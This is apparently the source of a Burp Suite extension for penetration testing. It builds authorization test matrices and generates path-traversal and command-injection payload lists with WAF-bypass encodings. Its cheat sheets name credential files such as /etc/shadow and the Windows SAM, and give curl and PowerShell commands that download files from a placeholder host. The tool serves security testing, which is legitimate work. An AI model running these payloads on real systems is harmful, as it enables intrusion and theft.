"""
Author: Volkan Dindar
"""
try:
    from burp import (IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory)
    from java.awt import (BorderLayout, FlowLayout, Color, Font, Dimension, Toolkit)
    from javax.swing import (JCheckBox, JMenuItem, JTextPane, JTable, JScrollPane, JProgressBar, SwingConstants, JComboBox, JButton, JTextField, JSplitPane, JPanel, JLabel, JRadioButton, ButtonGroup, JTabbedPane, BoxLayout)
    from javax.swing.border import EmptyBorder
    from javax.swing.table import (DefaultTableModel, TableCellRenderer, DefaultTableCellRenderer)
    import re, urlparse, urllib, urllib2, time, ssl
    from java.util import ArrayList
    from threading import Thread
    from random import randrange
    from java.awt.datatransfer import StringSelection
    
except ImportError:
    print "Failed to load dependencies."

VERSION = "0.20"
_colorful = True

class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("Agartha {LFI|RCE|Auth|SQLi|Http-Js}")
        print "Version " + VERSION + " is just loaded.\n\nAgartha is a security tool for:\n\t\t* Local File Inclusion (LFI), Directory Traversal,\n\t\t* Remote Code Execution (RCE),\n\t\t* Authorization/Authentication Access Matrix,\n\t\t* Boolean-Based SQL Injection,\n\t\t* Http Request to Javascript.\n\nFor more information and tutorial how to use, please visit:\n\t\thttps://github.com/volkandindar/agartha"        
        self._MainTabs = JTabbedPane()
        self._tabDictUI()
        self._tabAuthUI()
        self._MainTabs.addTab("Payload Generator", None, self._tabDictPanel, None)
        self._MainTabs.addTab("Authorization Matrix", None, self._tabAuthSplitpane, None)
        callbacks.addSuiteTab(self)
        callbacks.registerContextMenuFactory(self)
        callbacks.issueAlert("The extension has been loaded.")
        self.tableMatrixReset(self)
        return

    def authMatrixThread(self, ev):
        if not self._cbAuthSessionHandling.isSelected():
            self.userNamesHttpReq= []
            self.userNamesHttpReq.append("")
            self.userNamesHttpReq = self.userNamesHttpReqD
        self._requestViewer.setMessage("", False)
        self._responseViewer.setMessage("", False)
        self._lblAuthNotification.text = ""
        self._tbAuthNewUser.setForeground (Color.black)
        self._btnAuthNewUserAdd.setEnabled(False)
        self._btnAuthRun.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._cbAuthSessionHandling.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)
        self.progressBar.setValue(0)
        self.httpReqRes = [[],[],[],[],[]]
        self.httpReqRes.append([])
        self.tableMatrix.clearSelection()
        for x in range(0,self.tableMatrix.getRowCount()):
            for y in range(1,self.tableMatrix.getColumnCount()):
                self.tableMatrix.setValueAt("", x, y)
        
        i = 1000000 / ( self.tableMatrix.getRowCount() * (self.tableMatrix.getColumnCount()-1) )

        for x in range(0,self.tableMatrix.getRowCount()):
            for y in range(1,self.tableMatrix.getColumnCount()):
                self.tableMatrix.setValueAt(self.makeHttpCall(self.tableMatrix.getValueAt(x, 0), self.tableMatrix.getColumnName(y)), x, y)
                self.progressBar.setValue(self.progressBar.getValue() + i)
        
        self._customRenderer =  UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls)
        self._customTableColumnModel = self.tableMatrix.getColumnModel()
        for y in range(0,self.tableMatrix.getColumnCount()):
            self._customTableColumnModel.getColumn (y).setCellRenderer (self._customRenderer)
        self.tableMatrix.repaint()
        self.tableMatrix.setAutoCreateRowSorter(True)
        self.tableMatrix.setSelectionForeground(Color.red)
        self._btnAuthNewUserAdd.setEnabled(True)
        self._btnAuthRun.setEnabled(True)
        self._cbAuthColoring.setEnabled(True)
        self._cbAuthSessionHandling.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        self._cbAuthGETPOST.setEnabled(True)
        self.progressBar.setValue(1000000)
        self._lblAuthNotification.text = "Yellow, Orange and Red cell colors are representation of warning severities."
        return

    def makeHttpCall(self, urlAdd, userID):
        try:
            userID = self.userNames.index(userID)
            header = self.userNamesHttpReq[userID]            
            header = header.replace(header.splitlines()[0].split(" ", 2)[1], str(urlparse.urlparse(urlAdd).path))

            if "GET" in header[:3]:
                #request was in GET method and will be in POST
                if self._cbAuthGETPOST.getSelectedIndex() == 1:
                    header = self._callbacks.getHelpers().toggleRequestMethod((header))
            else:
                #request was in POST method and will be in GET
                if self._cbAuthGETPOST.getSelectedIndex() == 0:
                    header = self._callbacks.getHelpers().toggleRequestMethod((header))

            portNum = 80
            if urlparse.urlparse(urlAdd).port:
                portNum = urlparse.urlparse(urlAdd).port
            else:
                if urlparse.urlparse(urlAdd).scheme == "https":
                    portNum = 443
    
            try:
                #check for if service accessible                
                urllib2.urlopen(urlAdd, timeout=5).getcode()
            except Exception as e:
                if (re.findall(r'Host is down|timed out|Connection refused', str(e), re.IGNORECASE)):
                    self.httpReqRes[userID].append("")
                    return "Service not accessible!"
            
            _httpReqRes= self._callbacks.makeHttpRequest(self._helpers.buildHttpService(urlparse.urlparse(urlAdd).hostname, portNum, urlparse.urlparse(urlAdd).scheme), header)
            self.httpReqRes[userID].append(_httpReqRes)
            try:
                if userID > 0 and self._cbAuthSessionHandling.isSelected():
                    if "GET" in self._helpers.bytesToString(header)[:3]:    
                        header = self._callbacks.getHelpers().toggleRequestMethod((header))
                    httpReqHeader= self._helpers.bytesToString(header).split('\r\n\r\n')[0]
                    httpReqData= self._helpers.bytesToString(header).split('\r\n\r\n')[1]
                    httpResHeader = str(self._helpers.analyzeResponse(_httpReqRes.getResponse()).getHeaders())
                    httpResBody = str(self._helpers.bytesToString(_httpReqRes.getResponse())[self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset():])
                    self.userNamesHttpReq[userID]= self.sessionHandler(httpReqHeader,httpReqData,httpResHeader,httpResBody)
            except Exception as e:
                pass
                #print str(e)
                #return "cookie handling error!"

            return "HTTP " + str(self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getStatusCode()) + " : " + format(len(self._helpers.bytesToString(_httpReqRes.getResponse())) - self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset(), ',d') + "bytes"
        except:
            self.httpReqRes[userID].append("")
            return "Error"

    def sessionHandler(self, httpReqHeader, httpReqData, httpResHeader, httpResBody):
        httpReqHeader = "\n".join(httpReqHeader.split("\n"))        
        for line in httpReqHeader.splitlines()[1:]:
            if not any(re.findall(r'Accept:|Accept-|Cache|Connection:|Content-|Date|Expect|Forwarded|From|Host|If-Match|If-Modified-Since|If-None-Match|If-Range|If-Unmodified-Since|Max-Forwards|Origin|Pragma|Range|Referer|Upgrade|User-Agent|Warning|DNT:', line, re.IGNORECASE)):
                for d1 in line.split(':')[1:]:
                    for d2 in d1.split(';'):
                        param= str(d2.split('=')[0]).strip()
                        value= str(d2.split('=')[1]).strip()
                        if (re.findall(param, str(httpResHeader), re.IGNORECASE)):
                            for line2 in httpResHeader.splitlines():
                                for dd1 in line2.split(':')[1:]:
                                    for dd2 in dd1.split(';'):
                                        if param in dd2:
                                            httpReqHeader = httpReqHeader.replace(value, str(dd2.split('=')[1]))
                                            break
    
        if httpReqData:
            httpResBody = str(httpResBody).replace('\'','').replace('\"','')
            for d1 in httpReqData.split('&'):
                param =  str(d1.split('=')[0]).strip()
                value =  str(d1.split('=')[1]).strip()
                if (re.findall(param, str(httpResBody), re.IGNORECASE)):
                    for line in httpResBody.splitlines():
                        if param in line:
                            for d2 in line.split(' '):
                                    if 'value' == str(d2.split('=')[0]):
                                        if not value == str(d2.split('=')[1]):
                                            httpReqData = httpReqData.replace(value, str(d2.split('=')[1]))                                        
                                            break
            return httpReqHeader+ "\r\n\r\n" + httpReqData
        return httpReqHeader

    def authAdduser(self, ev):
        if self.userCount==4:
            self._lblAuthNotification.text = "You can add only 4 users"
            return
        
        for line in self._tbAuthURL.getText().split('\n'):
            if not self.isURLValid(str(line)) or line == self._txtURLDefault:
                self._tbAuthURL.setForeground (Color.red)
                self._lblAuthNotification.text = "Please check url list!"
                self._lblAuthNotification.setForeground (Color.red)
                return
        self._tbAuthURL.setForeground (Color.black)

        if not self._tbAuthHeader.getText().strip() or self._tbAuthHeader.getText().strip() == self._txtHeaderDefault or not self._tbAuthHeader.getText().split('\n')[0].count(' ') == 2:
            self._tbAuthHeader.setForeground (Color.red)
            self._lblAuthNotification.text = "Please provide a valid header!"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthHeader.setForeground (Color.black)

        if self._tbAuthNewUser.text in self.userNames:
            self._tbAuthNewUser.setForeground (Color.red)
            self._lblAuthNotification.text = "Please add another user name!"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthNewUser.setForeground (Color.black)

        if self.userCount==0:
            #header for unauth user
            unauthHeader=self._tbAuthHeader.getText().split('\n')[0] + "\n" + self._tbAuthHeader.getText().split('\n')[1]
            for line in self._tbAuthHeader.getText().split('\n')[2:]:
                if not any(re.findall(r'cookie|token|auth', line, re.IGNORECASE)):
                    unauthHeader +=  "\n" + line
                if not line:
                    break
            self.userNamesHttpReq[0] = unauthHeader
            self.userNamesHttpReqD[0] = unauthHeader
        
        self.userCount = self.userCount + 1
        self.userNames.append(self._tbAuthNewUser.text)
        self.userNamesHttpReq.append(self._tbAuthHeader.getText())
        self.userNamesHttpReqD.append(self._tbAuthHeader.getText())
        self.tableMatrix_DM.addColumn(self._tbAuthNewUser.text)
        self.userNamesHttpUrls.append([])

        urlList=[]
        for x in range(0,self.tableMatrix.getRowCount()):
                urlList.append(str(self.tableMatrix.getValueAt(x, 0)))
        
        for line in set(self._tbAuthURL.getText().split('\n')):
            if line and not any(re.findall(r'(log|sign).*(off|out)', line, re.IGNORECASE)):
                line=line.replace(' ','')
                self.userNamesHttpUrls[self.userCount].append(line)
                if line not in urlList:
                    self.tableMatrix_DM.addRow([line])
        
        self._tbAuthURL.setText("")
        self._btnAuthRun.setEnabled(True)
        self._btnAuthReset.setEnabled(True)
        self._lblAuthNotification.text = self._tbAuthNewUser.text + " added successfully!"
        self._lblAuthNotification.setForeground (Color.black)
        self._cbAuthColoring.setEnabled(True)
        self._cbAuthSessionHandling.setEnabled(True)
        self._cbAuthGETPOST.setEnabled(True)
        self.tableMatrix.repaint()
        self.tableMatrix.setAutoCreateRowSorter(True)
        self.tableMatrix.setSelectionForeground(Color.red)
        self._customRenderer =  UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls)
        self._customTableColumnModel = self.tableMatrix.getColumnModel()
        for y in range(0,self.tableMatrix.getColumnCount()):
            self._customTableColumnModel.getColumn (y).setCellRenderer (self._customRenderer)

        return

    def tableMatrixReset(self, ev):
        self.tableMatrix=[]        
        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLS','NoAuth'))
        self.tableMatrix = JTable(self.tableMatrix_DM)
        self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
        self.userCount= 0
        self.userNames= []
        self.userNames.append("NoAuth")
        self.userNamesHttpReq= []
        self.userNamesHttpReq.append("")
        self.userNamesHttpReqD= []
        self.userNamesHttpReqD.append("")
        self.userNamesHttpUrls = [[]]
        self.httpReqRes = [[],[],[],[],[]]
        self.httpReqRes.append([])
        self._requestViewer.setMessage("", False)
        self._responseViewer.setMessage("", False)
        self._lblAuthNotification.text = "Please add users to create an auth matrix"
        self._tbAuthNewUser.setForeground (Color.black)        
        self._txtHeaderDefault = "GET / HTTP/1.1\nHost: localhost\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: SessionID=......."
        self._tbAuthHeader.setText(self._txtHeaderDefault)
        self._txtURLDefault = "http://...."
        self._tbAuthURL.setText(self._txtURLDefault)
        self._txtUserDefault= "User1"
        self._tbAuthNewUser.text = self._txtUserDefault
        self._btnAuthRun.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._cbAuthSessionHandling.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)
        self._btnAuthNewUserAdd.setEnabled(True)
        self.progressBar.setValue(0)
        self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.getColumnModel().getSelectionModel().addListSelectionListener(self._updateReqResView)
        self._tabAuthSplitpaneHttp.setDividerLocation(0.5)
        self._tabAuthPanel.setDividerLocation(0.25)
        self._tabAuthSplitpane.setDividerLocation(0.7)        
        return

    def _cbAuthColoringFunc(self, ev):
        global _colorful
        if self._cbAuthColoring.isSelected():
            _colorful = True
        else:
            _colorful = False

        self.tableMatrix.repaint()
        return

    def _tabAuthUI(self):
        #panel top
        self._tbAuthNewUser = JTextField("", 15)
        self._tbAuthNewUser.setToolTipText("Please provide an username")
        self._btnAuthNewUserAdd = JButton("Add User", actionPerformed=self.authAdduser)
        self._btnAuthNewUserAdd.setPreferredSize(Dimension(90,27))
        self._btnAuthNewUserAdd.setToolTipText("Add User a specific user to create an auth matrix")
        self._btnAuthRun = JButton("RUN", actionPerformed=self.authMatrix)
        self._btnAuthRun.setPreferredSize(Dimension(150,27))
        self._btnAuthRun.setToolTipText("Start comparison")
        self._btnAuthReset = JButton("Reset", actionPerformed=self.tableMatrixReset)
        self._btnAuthReset.setPreferredSize(Dimension(90,27))
        self._btnAuthReset.setToolTipText("Clear all")
        self._btnAuthRun.setEnabled(False)
        self._btnAuthReset.setEnabled(False)       
        self._tbAuthHeader = JTextPane()
        self._tbAuthHeader.setContentType("text")
        self._tbAuthHeader.setToolTipText("HTTP request belons to the user. You may copy and paste it from Repater/Proxy")
        self._tbAuthHeader.setEditable(True)
        self._tbAuthURL = JTextPane()
        self._tbAuthURL.setContentType("text")
        self._tbAuthURL.setToolTipText("What url links can be accessible by her/him. Please dont forget to remove logout links!")
        self._tbAuthURL.setEditable(True)
        self._cbAuthColoring= JCheckBox('ColorFul', True, itemStateChanged=self._cbAuthColoringFunc)
        self._cbAuthColoring.setEnabled(False)
        self._cbAuthColoring.setToolTipText("Colors may help to analysis easily")
        self._cbAuthGETPOST= JComboBox(('GET', 'POST'))
        self._cbAuthGETPOST.setSelectedIndex(0)
        self._cbAuthGETPOST.setToolTipText("Which HTTP method will be used for the test")
        self._cbAuthSessionHandling= JCheckBox('Session Handler*', False)
        self._cbAuthSessionHandling.setEnabled(False)
        self._cbAuthSessionHandling.setToolTipText("Experimental: Auto-updates cookies and paramaters, like CSRF tokens")

        #top panel
        _tabAuthPanel1 = JPanel(BorderLayout())
        _tabAuthPanel1.setBorder(EmptyBorder(0, 0, 10, 0))
        _tabAuthPanel1_A = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabAuthPanel1_A.setPreferredSize(Dimension(400,105))
        _tabAuthPanel1_A.setMinimumSize(Dimension(400,105))
        _tabAuthPanel1_A.add(self._btnAuthNewUserAdd)
        _tabAuthPanel1_A.add(self._tbAuthNewUser)
        _tabAuthPanel1_A.add(self._cbAuthGETPOST)
        _tabAuthPanel1_A.add(self._btnAuthReset)
        _tabAuthPanel1_A.add(self._btnAuthRun)
        _tabAuthPanel1_A.add(self._cbAuthColoring)
        _tabAuthPanel1_A.add(self._cbAuthSessionHandling)
        _tabAuthPanel1_B = JScrollPane(self._tbAuthHeader, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        _tabAuthPanel1_C = JScrollPane(self._tbAuthURL, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        self._tabAuthSplitpaneHttp = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, _tabAuthPanel1_B, _tabAuthPanel1_C)
        #self._tabAuthSplitpaneHttp.setPreferredSize(Dimension(800,100))
        _tabAuthPanel1.add(_tabAuthPanel1_A,BorderLayout.WEST)
        _tabAuthPanel1.add(self._tabAuthSplitpaneHttp,BorderLayout.CENTER)
        #panel top

        #panel center
        self._lblAuthNotification = JLabel("", SwingConstants.LEFT)
        self.tableMatrix=[]
        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLS','NoAuth'))
        self.tableMatrix = JTable(self.tableMatrix_DM)
        self.tableMatrix.setAutoCreateRowSorter(True)
        self.tableMatrix.setSelectionForeground(Color.red)
        self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.getColumnModel().getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.setOpaque(True)
        self.tableMatrix.setFillsViewportHeight(True)
        self.tableMatrix_SP = JScrollPane()
        self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
        _tabAuthPanel2 = JPanel()
        #_tabAuthPanel2.setPreferredSize(Dimension(100, (self._tabAuthSplitpane.getPreferredSize().height) / 2))
        _tabAuthPanel2.setLayout(BoxLayout(_tabAuthPanel2, BoxLayout.Y_AXIS))
        _tabAuthPanel2.add(self._lblAuthNotification,BorderLayout.NORTH)
        _tabAuthPanel2.add(self.tableMatrix_SP,BorderLayout.NORTH)
        self.progressBar = JProgressBar()
        self.progressBar.setMaximum(1000000)
        self.progressBar.setMinimum(0)
        _tabAuthPanel2.add( self.progressBar, BorderLayout.SOUTH)
        #panel center
        #_tabAuthPanel = JPanel(BorderLayout())
        #_tabAuthPanel.add(_tabAuthPanel1,BorderLayout.NORTH)
        #_tabAuthPanel.add(_tabAuthPanel2,BorderLayout.CENTER)
        self._tabAuthPanel = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthPanel.setBorder(EmptyBorder(20, 20, 20, 20))
        self._tabAuthPanel.setTopComponent(_tabAuthPanel1)
        self._tabAuthPanel.setBottomComponent(_tabAuthPanel2)

        #panel bottom
        _tabsReqRes = JTabbedPane()        
        self._requestViewer = self._callbacks.createMessageEditor(self, False)
        self._responseViewer = self._callbacks.createMessageEditor(self, False)
        _tabsReqRes.addTab("Request", self._requestViewer.getComponent())
        _tabsReqRes.addTab("Response", self._responseViewer.getComponent())
        #panel bottom

        self._tabAuthSplitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)        
        self._tabAuthSplitpane.setBorder(EmptyBorder(20, 20, 20, 20))        
        self._tabAuthSplitpane.setTopComponent(self._tabAuthPanel)
        self._tabAuthSplitpane.setBottomComponent(_tabsReqRes)

    def _tabDictUI(self):
        #top panel
        self._txtDefaultLFI="Example: 'etc/passwd', 'C:\\boot.ini'"
        self._txtDefaultRCE="Examples: $'sleep 1000', >'timeout 1000'"
        self._txtDefaultSQLi="No input is needed to supply!"
        self._txtCheatSheetLFI=""
        self._txtCheatSheetLFI+="Directory Traversal Linux\t\t\tDirectory Traversal Windows\n"
        self._txtCheatSheetLFI+="\t/etc/passwd\t\t\t\tC:\\boot.ini\n"
        self._txtCheatSheetLFI+="\t/etc/profile\t\t\t\t\tC:\Windows\win.ini\n"
        self._txtCheatSheetLFI+="\t/proc/self/environ\t\t\t\tC:\windows\system.ini\n"
        self._txtCheatSheetLFI+="\t/proc/self/status\t\t\t\tC:\windows\system32\\notepad.exe\n"
        self._txtCheatSheetLFI+="\t/etc/hosts\t\t\t\t\tC:\Windows\System32\drivers\etc\hosts\n"
        self._txtCheatSheetLFI+="\t/etc/shadow\t\t\t\tC:\Windows\System32\Config\SAM\n"
        self._txtCheatSheetLFI+="\t/etc/group\t\t\t\t\tC:\users\public\desktop\desktop.ini\n"
        self._txtCheatSheetLFI+="\t/var/log/auth.log\t\t\t\tC:\windows\system32\eula.txt\n"
        self._txtCheatSheetLFI+="\t/var/log/auth.log\t\t\t\tC:\windows\system32\license.rtf\n"
        self._txtCheatSheetRCE=""
        self._txtCheatSheetRCE+="RCE Linux\t\t\t\t\tRCE Windows\n"
        self._txtCheatSheetRCE+="\tcat /etc/passwd\t\t\t\tcmd.exe?/c type file.txt\n"
        self._txtCheatSheetRCE+="\tuname -a\t\t\t\t\tsysteminfo\n"
        self._txtCheatSheetRCE+="\t/usr/bin/id\t\t\t\t\twhoami /priv\n"
        self._txtCheatSheetRCE+="\tping -c 10 X.X.X.X\t\t\t\tping -n 10 X.X.X.X\n"
        self._txtCheatSheetRCE+="\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\file.txt')\n"
        self._lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
        self._btnGenerateDict = JButton("Generate the Payload", actionPerformed=self.funcGeneratePayload)
        self._lblStatusLabel = JLabel(" ", SwingConstants.LEFT)
        self._txtDictParam = JTextField(self._txtDefaultLFI, 30)
        self._rbDictLFI = JRadioButton('DT/LFI', True, itemStateChanged=self.funcRBSelection);
        self._rbDictRCE = JRadioButton('RCE', itemStateChanged=self.funcRBSelection)
        self._rbDictSQLi = JRadioButton('SQLi', itemStateChanged=self.funcRBSelection)
        self._rbDictXXE = JRadioButton('XXE', itemStateChanged=self.funcRBSelection)
        self._rbDictXSS = JRadioButton('XSS', itemStateChanged=self.funcRBSelection)
        self._rbDictCheatSheet = JRadioButton('Cheat Sheet', itemStateChanged=self.funcRBSelection)
        self._rbDictFuzzer = JRadioButton('Fuzzer', itemStateChanged=self.funcRBSelection)
        _rbPanel = JPanel()
        _rbPanel.add(self._rbDictLFI)
        _rbPanel.add(self._rbDictRCE)
        _rbPanel.add(self._rbDictSQLi)
        #_rbPanel.add(self._rbDictCheatSheet)
        #_rbPanel.add(self._rbDictXXE)
        #_rbPanel.add(self._rbDictXSS)
        #_rbPanel.add(self._rbDictFuzzer)
        _rbGroup = ButtonGroup()
        _rbGroup.add(self._rbDictLFI)
        _rbGroup.add(self._rbDictRCE)
        _rbGroup.add(self._rbDictSQLi)
        _rbGroup.add(self._rbDictCheatSheet)
        _rbGroup.add(self._rbDictXXE)
        _rbGroup.add(self._rbDictXSS)
        _rbGroup.add(self._rbDictFuzzer)
        self._cbDictEncoding= JCheckBox('Waf Bypass', True)
        self._cbDictEquality= JCheckBox(')', False)
        self._cbDictDepth = JComboBox(list(range(0, 20)))
        self._cbDictDepth.setSelectedIndex(5)
        _cbDictDepthPanel = JPanel()
        _cbDictDepthPanel.add(self._cbDictDepth)
        
        _tabDictPanel_1 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabDictPanel_1.setBorder(EmptyBorder(0, 0, 10, 0))
        _tabDictPanel_1.add(self._txtDictParam, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._btnGenerateDict, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_rbPanel, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._lblDepth, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._cbDictEquality, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_cbDictDepthPanel, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._cbDictEncoding, BorderLayout.PAGE_START)
        #top panel

        #center panel
        _tabDictPanel_2 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabDictPanel_2.add(self._lblStatusLabel)
        #center panel
        
        #bottom panel 
        self._tabDictResultDisplay = JTextPane()
        self._tabDictResultDisplay.setFont(self._tabDictResultDisplay.getFont().deriveFont(Font.PLAIN, 14))
        self._tabDictResultDisplay.setContentType("text")
        self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
        self._tabDictResultDisplay.setEditable(False)
        _tabDictPanel_3 = JPanel(BorderLayout(10, 10))
        _tabDictPanel_3.setBorder(EmptyBorder(10, 0, 0, 0))
        _tabDictPanel_3.add(JScrollPane(self._tabDictResultDisplay), BorderLayout.CENTER)
        #bottom panel 

        self._tabDictPanel = JPanel()
        self._tabDictPanel.setLayout(BoxLayout(self._tabDictPanel, BoxLayout.Y_AXIS))
        self._tabDictPanel.add(_tabDictPanel_1)
        self._tabDictPanel.add(_tabDictPanel_2)
        self._tabDictPanel.add(_tabDictPanel_3)

    def funcGeneratePayload(self, ev):
        self._lblStatusLabel.setForeground (Color.red)
        if self._rbDictSQLi.isSelected():            
            self._txtDictParam.setText(self._txtDefaultSQLi)
        elif not self.isValid():
            self._lblStatusLabel.setText("input is not valid. ")
            if self._rbDictLFI.isSelected():
                self._lblStatusLabel.setText("File "+ self._lblStatusLabel.text + self._txtDefaultLFI)
                self._txtDictParam.setText("etc/passwd")
            elif self._rbDictRCE.isSelected():
                self._lblStatusLabel.setText("Remote code " +self._lblStatusLabel.text + self._txtDefaultRCE)
                self._txtDictParam.setText("sleep 1000")
            return 

        self._lblStatusLabel.setForeground (Color.black)
        self._txtDictParam.text = self._txtDictParam.text.strip()
        self._tabDictResultDisplay.setText("")
        self._lblStatusLabel.setText('')
        if self._rbDictRCE.isSelected():
            self.funcRCE(self)
        if self._rbDictLFI.isSelected():
            self.funcLFI(self)
        if self._rbDictSQLi.isSelected():
            self.funcSQLi(self)            
        return
       
    def isValid(self):
        # check if any special chars
        regex = re.compile('[@,\'\"!#$%^&*<>\|}{]')
        if(regex.search(self._txtDictParam.text) == None) and self._txtDictParam.text.strip():
            #clear
            return True
        else:
            #special char
            return False

    def funcRBSelection(self, ev):
        self._lblStatusLabel.setText("")
        self._lblDepth.setVisible(False)
        self._cbDictEncoding.setVisible(False)
        self._cbDictEquality.setVisible(False)
        self._cbDictDepth.setVisible(False)
        if self._rbDictLFI.isSelected():
            self._txtDictParam.setText(self._txtDefaultLFI)
            self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
            self._lblDepth.setVisible(True)
            self._cbDictEncoding.setVisible(True)
            self._cbDictEquality.setVisible(True)
            self._cbDictDepth.setVisible(True)
        elif self._rbDictRCE.isSelected():
            self._txtDictParam.setText(self._txtDefaultRCE)
            self._tabDictResultDisplay.setText(self._txtCheatSheetRCE)
        elif self._rbDictSQLi.isSelected():
            self._txtDictParam.setText(self._txtDefaultSQLi)
            self.funcSQLi(self)
        elif self._rbDictCheatSheet.isSelected():
            self._tabDictResultDisplay.setText(self._txtCheatSheet)
            self._lblStatusLabel.setText('')
        return

    def funcRCE(self, ev):
        listRCE = []
        interruptors = ["", "`", "'", "\'", "\\'", "\"", "\\\"", "\\\\\""]
        separators  = ["", "&", "&&", "|", "||", ";", "%0a", "0x0a", "%0d", "0x0d", "%1a", "0x1a", "%00", "0x00", "\\n", "\\\\n", "\\r", "\\\\r"]
        for interruptor in interruptors:
            interruptor.strip()
            for separator in separators:
                separator.strip()
                listRCE.append(((interruptor + separator).strip() + self._txtDictParam.text).strip() + "\n")
                listRCE.append(((interruptor + separator).strip() + self._txtDictParam.text + interruptor).strip() + "\n")
                listRCE.append(((interruptor + separator).strip() + self._txtDictParam.text + separator).strip() + "\n")
                listRCE.append(((interruptor + separator).strip() + self._txtDictParam.text + separator + interruptor).strip() + "\n")                
                if separator:
                    listRCE.append(((interruptor + separator + interruptor).strip() + self._txtDictParam.text).strip() + "\n")
                    listRCE.append(((interruptor + separator + interruptor).strip() + self._txtDictParam.text + interruptor).strip() + "\n")

        interruptors = ["", "\\n", "\\\\n", "\\r", "\\\\r"]        
        separators  = ["", "&", "&&", "|", "||", ";", "%0a", "0x0a", "%0d", "0x0d", "%1a", "0x1a", "%00", "0x00"]
        for interruptor in interruptors:
            interruptor.strip()
            for separator in separators:
                separator.strip()
                listRCE.append(((interruptor + separator).strip() + self._txtDictParam.text).strip() + "\n")
                listRCE.append(((interruptor + separator).strip() + self._txtDictParam.text + separator).strip() + "\n")
                listRCE.append(((separator + interruptor).strip() + self._txtDictParam.text).strip() + "\n")
                listRCE.append(((separator + interruptor).strip() + self._txtDictParam.text + separator).strip() + "\n")
                listRCE.append((interruptor + self._txtDictParam.text + separator).strip() + "\n")
                if not interruptor:
                    listRCE.append(separator + "{" + self._txtDictParam.text.replace(" ",",") + "}" + "\n")
                    listRCE.append(separator + "{" + self._txtDictParam.text.replace(" ",",") + "}" + separator + "\n")
                    listRCE.append(separator + "$(" + self._txtDictParam.text + ")" + "\n")
                    listRCE.append(separator + "$(" + self._txtDictParam.text + ")" + separator + "\n")
                
        listRCE = list(set(listRCE))
        listRCE.sort()
        self._tabDictResultDisplay.setText(''.join(map(str, listRCE)))
        self._lblStatusLabel.setText('Remote code dictionary: "' + self._txtDictParam.text + '", with '+ str(len(listRCE)) + ' result.')
        return

    def funcLFI(self, ev):
        listLFI = []
        dept= int(self._cbDictDepth.getSelectedItem())
        
        if self._txtDictParam.text.startswith('/') or self._txtDictParam.text.startswith('\\'):
            self._txtDictParam.text = self._txtDictParam.text[1:]
        
        filePath = self._txtDictParam.text.replace("\\","/")
        
        counter = 0
        if self._cbDictEquality.isSelected():
            counter = dept
            
        while counter <= dept:
            _resultTxt = ""
            i=1
            while i <= counter:
                _resultTxt += "../"
                i = i + 1
                
            listLFI.append(_resultTxt + filePath + "\n")
            
            if self._cbDictEncoding.isSelected():
                listLFI.append(_resultTxt + filePath + "%00index.html\n")
                listLFI.append(_resultTxt + filePath + "%20index.html\n")
                listLFI.append(_resultTxt + filePath + "%09index.html\n")
                listLFI.append(_resultTxt + filePath + "%0Dindex.html\n")
                listLFI.append(_resultTxt + filePath + "%FFindex.html\n")
                listLFI.append(_resultTxt + filePath + "%00\n")
                listLFI.append(_resultTxt + filePath + "%20\n")
                listLFI.append(_resultTxt + filePath + "%09\n")
                listLFI.append(_resultTxt + filePath + "%0D\n")
                listLFI.append(_resultTxt + filePath + "%FF\n")
                listLFI.append(_resultTxt + filePath + "/..;/\n")
                listLFI.append(_resultTxt + filePath + ";index.html\n")
                listLFI.append(_resultTxt + filePath + "%00.jpg\n")
                listLFI.append(_resultTxt + filePath + "%00.jpg\n")
                listLFI.append(_resultTxt + filePath + "%20.jpg\n")
                listLFI.append(_resultTxt + filePath + "%09.jpg\n")
